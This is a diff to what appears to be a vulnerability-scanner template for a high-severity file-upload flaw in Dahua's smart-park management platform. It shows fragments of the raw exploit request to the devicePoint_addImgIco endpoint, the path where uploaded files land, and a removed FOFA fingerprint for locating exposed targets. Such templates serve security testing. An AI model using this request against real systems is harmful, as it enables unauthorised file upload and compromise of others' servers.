@@ -3,12 +3,8 @@ info:
   name: 大华智慧园区综合管理平台hasSubsystem存在文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fnvfndg9o1y914gf'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fnvfndg9o1y914gf
-    fofa: app="dahua-智慧园区综合管理平台"
 http:
 - raw:
   - 'POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
@@ -39,7 +35,6 @@ http:
 
     --A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984807686-7365b0a9-47e6-49d2-af7d-5389b74119a8.png)
 
     文件路径 http://ip:port/upload/emap/society_new/+文件名'
   redirects: false
